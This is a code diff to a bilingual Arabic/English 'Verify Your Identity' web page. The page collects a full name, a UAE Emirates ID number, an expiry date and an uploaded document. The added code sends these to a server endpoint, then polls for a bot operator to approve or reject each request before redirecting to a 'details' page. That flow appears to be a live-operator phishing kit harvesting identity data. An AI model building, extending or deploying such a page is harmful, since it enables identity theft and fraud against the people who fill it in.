@@ -19,6 +19,7 @@
   --gray:#c9ccd1;
   --gold:#7a4a12;
   --green:#16a34a;
+  --red:#dc2626;
   padding-top:env(safe-area-inset-top,0px);
   padding-bottom:env(safe-area-inset-bottom,0px);
 }
@@ -36,6 +37,7 @@
     --blue:#4c7dff;
     --blue2:#3a68e6;
     --green:#22c55e;
+    --red:#f87171;
   }
 }
 *{box-sizing:border-box}
@@ -197,7 +199,7 @@ body{
 }
 .drop input{display:none}
 .err{
-  color:#dc2626;
+  color:var(--red);
   font-size:13px;
   min-height:18px;
   margin-top:5px;
@@ -255,22 +257,33 @@ body{
   font-family:"Segoe UI",Arial,sans-serif;
 }
 .cta svg{stroke:#fff;fill:none;stroke-width:2;flex:none}
-.done-box{
+.status-box{
   display:none;
   text-align:center;
   padding:42px 20px;
 }
-.done-box h3{
+.status-box h3{
   margin:10px 0 8px;
   font-size:24px;
-  color:var(--green);
 }
-.done-box p{
+.status-box p{
   margin:0 auto 22px;
-  max-width:520px;
+  max-width:540px;
   color:var(--muted);
   font-size:15px;
   line-height:1.6;
+}
+.retry-btn{
+  display:none;
+  background:var(--blue);
+  color:#fff;
+  border:0;
+  border-radius:10px;
+  padding:11px 22px;
+  font:inherit;
+  font-size:15px;
+  font-weight:700;
+  cursor:pointer;
 }
 @media(max-width:820px){
   .card{padding:20px 16px;margin:14px 12px 28px}
@@ -315,7 +328,7 @@ body{
     </svg>
     <h1>التحقق من الهوية</h1>
     <h2>Verify Your Identity</h2>
-    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإتمام التحقق.</p>
+    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإرسال الطلب إلى البوت وانتظار الموافقة.</p>
   </section>
 
   <form class="form" id="f" novalidate>
@@ -365,28 +378,33 @@ body{
     <div class="accept-box">
       <label class="accept-label">
         <input type="checkbox" id="acceptCheck">
-        <span>أوافق وأؤكد صحة البيانات المدخلة وأرغب بالمتابعة.</span>
+        <span>أوافق وأؤكد صحة البيانات المدخلة وأرغب بإرسالها للمراجعة عبر البوت.</span>
       </label>
       <div class="err" id="e-accept"></div>
     </div>
 
-    <button class="cta" type="submit">
+    <button class="cta" type="submit" id="submitBtn">
       <svg width="30" height="30" viewBox="0 0 24 24">
         <path d="M12 2l8 3v6c0 5-3.5 9-8 11-4.5-2-8-6-8-11V5z"/>
         <path d="M8.5 12l2.5 2.5 4.5-5"/>
       </svg>
-      <div>قبول ومتابعة<span>Accept &amp; Continue</span></div>
+      <div>قبول وإرسال للموافقة<span>Accept &amp; Submit</span></div>
     </button>
   </form>
 
-  <div class="done-box" id="doneBox">
-    <div style="font-size:48px">✅</div>
-    <h3>تم التحقق والقبول بنجاح</h3>
-    <p>تم حفظ بيانات التحقق بنجاح. يمكنك الآن ربط نقطة الإرسال بالبوت الجديد الخاص بك.</p>
+  <div class="status-box" id="statusBox">
+    <div id="statusIcon" style="font-size:48px">⏳</div>
+    <h3 id="statusTitle">جاري انتظار موافقة البوت...</h3>
+    <p id="statusDesc">تم إرسال طلبك بنجاح. يرجى انتظار مراجعة الطلب والضغط على موافقة أو رفض من البوت.</p>
+    <button class="retry-btn" id="retryBtn" type="button">إعادة المحاولة</button>
   </div>
 </main>
 
 <script>
+const SUBMIT_API = "/api/submit";
+const STATUS_API = "/api/webhook";
+const NEXT_PAGE = "details.html";
+
 const $ = id => document.getElementById(id);
 
 $('eid').addEventListener('input', e => {
@@ -414,7 +432,53 @@ $('file').addEventListener('change', e => {
   $('fn').textContent = f.name;
 });
 
-$('f').addEventListener('submit', e => {
+function createRequestId() {
+  return "REQ-" + Date.now().toString().slice(-6) + "-" + Math.floor(100 + Math.random() * 900);
+}
+
+let pollTimer = null;
+
+function pollDecision(requestId) {
+  clearInterval(pollTimer);
+  pollTimer = setInterval(async () => {
+    try {
+      const res = await fetch(`${STATUS_API}?requestId=${encodeURIComponent(requestId)}`, {
+        cache: "no-store"
+      });
+      const json = await res.json();
+
+      if (json.status === "approved") {
+        clearInterval(pollTimer);
+        $('statusIcon').textContent = "✅";
+        $('statusTitle').style.color = "var(--green)";
+        $('statusTitle').textContent = "تمت الموافقة على التحقق";
+        $('statusDesc').textContent = "تم قبول طلبك من البوت بنجاح، جاري تحويلك الآن...";
+        setTimeout(() => {
+          window.location.href = NEXT_PAGE;
+        }, 1200);
+      } else if (json.status === "rejected") {
+        clearInterval(pollTimer);
+        $('statusIcon').textContent = "❌";
+        $('statusTitle').style.color = "var(--red)";
+        $('statusTitle').textContent = "تم رفض طلب التحقق";
+        $('statusDesc').textContent = "لم تتم الموافقة على الطلب. يمكنك التحقق من البيانات وإعادة المحاولة.";
+        $('retryBtn').style.display = "inline-block";
+      }
+    } catch (_) {}
+  }, 2500);
+}
+
+$('retryBtn').addEventListener('click', () => {
+  clearInterval(pollTimer);
+  $('statusBox').style.display = 'none';
+  $('retryBtn').style.display = 'none';
+  $('statusTitle').style.color = 'var(--text)';
+  $('f').style.display = 'block';
+  $('submitBtn').disabled = false;
+  $('submitBtn').style.opacity = '1';
+});
+
+$('f').addEventListener('submit', async e => {
   e.preventDefault();
   let ok = true;
   const setErr = (id, msg) => {
@@ -426,7 +490,7 @@ $('f').addEventListener('submit', e => {
   const eidVal = $('eid').value.trim();
   const expVal = $('exp').value.trim();
   const accepted = $('acceptCheck').checked;
-  const fileName = $('file').files[0] ? $('file').files[0].name : 'غير مرفق';
+  const fileObj = $('file').files[0] || null;
 
   setErr('name', fullName.length < 3 ? 'يرجى إدخال الاسم الكامل' : '');
   setErr('eid', /^784-\d{4}-\d{7}-\d$/.test(eidVal) ? '' : 'يرجى إدخال رقم الهوية بالصيغة 784-XXXX-XXXXXXX-X');
@@ -446,19 +510,44 @@ $('f').addEventListener('submit', e => {
 
   if (!ok) return;
 
-  const verificationData = {
+  const requestId = createRequestId();
+  const payload = {
+    requestId,
     name: fullName,
     eid: eidVal,
     exp: expVal,
-    file: fileName,
-    verifiedAt: new Date().toISOString()
+    fileName: fileObj ? fileObj.name : "غير مرفق"
   };
 
-  localStorage.setItem('verified_identity', JSON.stringify(verificationData));
+  localStorage.setItem('verified_identity', JSON.stringify(payload));
 
-  // مكان جاهز لإضافة كود الإرسال للبوت الجديد عند تجهيزه
-  $('f').style.display = 'none';
-  $('doneBox').style.display = 'block';
+  $('submitBtn').disabled = true;
+  $('submitBtn').style.opacity = '0.7';
+
+  try {
+    const res = await fetch(SUBMIT_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    if (!res.ok || !data.ok) {
+      throw new Error(data.error || "تعذر إرسال الطلب");
+    }
+
+    $('f').style.display = 'none';
+    $('statusIcon').textContent = "⏳";
+    $('statusTitle').style.color = "var(--text)";
+    $('statusTitle').textContent = "جاري انتظار موافقة البوت...";
+    $('statusDesc').textContent = `رقم الطلب: ${requestId} — بانتظار الضغط على موافقة أو رفض من البوت.`;
+    $('statusBox').style.display = 'block';
+
+    pollDecision(requestId);
+  } catch (err) {
+    $('e-accept').textContent = err.message || "حدث خطأ أثناء الإرسال";
+    $('submitBtn').disabled = false;
+    $('submitBtn').style.opacity = '1';
+  }
 });
 </script>
 </body>
